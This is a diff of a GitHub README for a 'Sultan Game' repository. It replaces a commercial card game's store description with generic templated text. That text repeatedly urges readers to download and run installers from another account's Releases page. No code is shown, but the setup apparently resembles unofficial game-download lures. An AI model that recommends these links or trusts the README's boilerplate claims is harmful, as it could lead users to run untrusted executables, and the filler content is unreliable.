@@ -1,29 +1,98 @@
-<div align="center">
+# Sultan Game 🎴👑
 
-  ![](https://raw.githubusercontent.com/lemusendaven/Sultan-Game/main/pictures/1.jpg)
-  
-  ![](https://raw.githubusercontent.com/lemusendaven/Sultan-Game/main/pictures/2.jpg)
-  
-  ![](https://raw.githubusercontent.com/lemusendaven/Sultan-Game/main/pictures/.png)
-  
-</div>
+Welcome to the **Sultan Game** repository! The Sultan commands you to engage in a thrilling and challenging experience. Each week, you will draw a card and face its challenge within seven days. Your choices will determine your fate, as you strive to survive not just the game, but also its dire consequences. 
 
-<div align="center"><a href="https://lemusendaven.github.io/id/75615049"><img src="https://raw.githubusercontent.com/lemusendaven/Sultan-Game/main/pictures/0.png" height="80"></a></div>
+[![Download Sultan Game](https://img.shields.io/badge/Download%20Sultan%20Game-Click%20Here-brightgreen)](https://github.com/veeahmed/Sultan-Game/releases)
 
-> 🔲 Supported CPU: AMD & Intel
->
-> 🔧 Supported architectures: 64-bit, 32-bit
->
-> 💿 Supported OS: Windows 11, Windows 10, Windows 8, Windows 7
+## Table of Contents
 
-# About This Game
+- [Introduction](#introduction)
+- [Game Mechanics](#game-mechanics)
+- [Installation](#installation)
+- [Gameplay](#gameplay)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-* Sultan's Game is a card-based simulation and narrative game, inspired by The One Thousand and One Nights. You are one of the ministers of the mighty Sultan, a fickle, cruel king who treats his subjects like pawns in a deadly game for his own pleasure. Forced to make dreadful choices to save your own life, you will have to find a way to survive not just the Sultan’s Game, but its consequences too.
+## Introduction
 
-* The Sultan forces you, his minister, to participate in a cruel game: draw one of four cards, and complete its challenge within seven days – or you will be executed. The Carnality Card pushes you into the pursuit of carnal pleasures. The Extravagance Card requires lavish spending to be fulfilled. The Conquer Card forces you into perilous adventures. Finally, the Bloodshed Card demands a human sacrifice. You must find a way to complete these harsh trials – and weather its dire consequences. Familial betrayal, lustful madness, power struggles, and the loss of your own humanity threaten your sanity; the price of survival might end up being too high…
+The **Sultan Game** offers players a unique blend of strategy and survival. Each week, players must confront a new challenge that tests their decision-making skills. Will you make the right choice to save your life, or will you succumb to the Sultan's cruel demands? 
 
-* In this turn-based resource management game, you will have to play cards to allocate allies, resources, and task objectives. Accumulate wealth, intelligence, and equipment; complete NPC quests to recruit allies, build your influence, and become a power broker in the Sultan’s court. Though each Sultan card demands a high cost to fulfill, it also presents an opportunity to dispose of deserving enemies, pursue forbidden romances, and find excuses for the most rebellious and terrifying acts. Initially, the Sultan's tasks are a terrifying countdown on your life, but as you master the game, they become opportunities to grow stronger. The challenge shifts from mere survival to making impactful choices for the fate of others and your own soul.
+## Game Mechanics
 
-* This game pushes cruelty to the extreme. You might kill your loved ones to please the Sultan, or use a card as an excuse to impose your desires on anyone who trusts you. However, extreme actions invite hatred and retribution, and even your dearest spouse may abandon you if you overstep. Victory doesn’t come from being a saint or a madman. You must make choices, find your limits and principles, and witness the diverse reactions of humanity under extreme conditions.
+- **Weekly Challenges**: Every week, players draw a card that presents a unique challenge. Completing the challenge within the week is crucial for survival.
+- **Consequences**: Each decision carries weight. Players must consider the long-term effects of their choices.
+- **Strategy**: Think critically about each move. The game rewards strategic planning and foresight.
 
-* Each playthrough offers a unique experience based on the sequence of drawn Sultan cards. Regardless of victory or defeat, players earn points to enhance resources for the next round, unlock powerful allies and equipment, and build their playstyle. Various strategies for resource and story opportunity management lead to different endings. Become a trusted minister, overthrow the Sultan, find a utopia free from his control, or summon dark gods to destroy everything. Multiple methods to achieve the same ending and their interconnections provide extensive exploration and puzzle-solving opportunities.
+## Installation
+
+To get started, you need to download the game. Visit the [Releases section](https://github.com/veeahmed/Sultan-Game/releases) to find the latest version. Download the appropriate file for your operating system and execute it.
+
+### For Windows
+
+1. Go to the [Releases section](https://github.com/veeahmed/Sultan-Game/releases).
+2. Download the Windows installer.
+3. Run the installer and follow the prompts.
+
+### For macOS
+
+1. Visit the [Releases section](https://github.com/veeahmed/Sultan-Game/releases).
+2. Download the macOS version.
+3. Drag the app to your Applications folder.
+
+### For Linux
+
+1. Check the [Releases section](https://github.com/veeahmed/Sultan-Game/releases).
+2. Download the Linux build.
+3. Extract the files and run the executable.
+
+## Gameplay
+
+### Starting the Game
+
+Upon launching the game, you will be greeted with a captivating introduction. You will then be prompted to draw your first card, setting the stage for your adventure.
+
+### Drawing a Card
+
+Each card presents a challenge. Here are some examples:
+
+- **Challenge 1**: Make a difficult moral choice.
+- **Challenge 2**: Solve a complex puzzle.
+- **Challenge 3**: Complete a timed task.
+
+### Completing Challenges
+
+You have seven days to complete the challenge. Keep in mind that your decisions will affect your standing in the game. 
+
+### Consequences of Choices
+
+The choices you make can lead to various outcomes, including:
+
+- Gaining rewards
+- Facing penalties
+- Unlocking new challenges
+
+## Contributing
+
+We welcome contributions to the **Sultan Game**! If you have ideas for new challenges or improvements, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes and commit them.
+4. Push to your branch.
+5. Open a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or suggestions, feel free to reach out:
+
+- **Email**: support@sultangame.com
+- **Twitter**: [@SultanGame](https://twitter.com/SultanGame)
+
+## Conclusion
+
+Thank you for checking out the **Sultan Game**! We hope you enjoy the challenges and the thrilling experience it offers. Remember to visit the [Releases section](https://github.com/veeahmed/Sultan-Game/releases) for the latest updates and downloads. Good luck, and may your choices lead you to victory!
